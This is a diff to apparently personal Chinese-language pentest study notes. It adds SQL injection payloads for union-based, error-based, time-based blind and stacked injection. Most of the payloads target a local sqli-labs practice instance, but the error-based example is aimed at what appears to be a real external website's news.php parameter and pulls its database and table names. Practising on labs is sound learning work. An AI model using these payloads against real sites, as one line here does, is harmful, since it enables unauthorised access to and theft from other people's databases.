@@ -5,6 +5,11 @@
 
 - ### 联合注入
 ```sql
+**有可能不在当前库：
+union select 1,schema_name from information_schema.schemata #
+
+
+
 http://127.0.0.1/sqli-labs/Less-1/?id=1' and 1=2 union select 1,database(),3%23
 
 http://127.0.0.1/sqli-labs/Less-1/?id=1' and 1=2 union select 1,(select group_concat(schema_name) from information_schema.schemata),3%23
@@ -22,6 +27,17 @@ http://127.0.0.1/sqli-labs/Less-1/?id=1' and 1=2 union select 1,(select group_co
 
 ```
 
+- ### 报错注入
+```sql
+https://www.starshine.com.tw/news.php?id=1543' and updatexml(1,concat(0x7e,database(),0x7e),1)
+
+?id=1543' and updatexml(1,concat(0x7e,(select mid(table_name,1,10) from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)
+```
+- ### 时间盲注
+```
+?id=-1' and if(substr(database(),1,1)='x',sleep(5),1) -- -
+
+```
 
 - ###  布尔盲注
 
@@ -38,7 +54,8 @@ limit m ：检索前m行数据，显示1-10行数据（m>0）
 limit(x,y)：检索从x+1行开始的y行数据
 
 ```
-
+- ### 堆叠注入
+![[Pasted image 20231215145107.png]]
 - ### sqlmap
 ```shell
 
@@ -69,7 +86,7 @@ limit(x,y)：检索从x+1行开始的y行数据
 
 ## RCE（一般是可以看源码）
 
-[[简单协议和RCE]]
+[[19、简单协议和RCE]]
 
 ## 代码审计
 
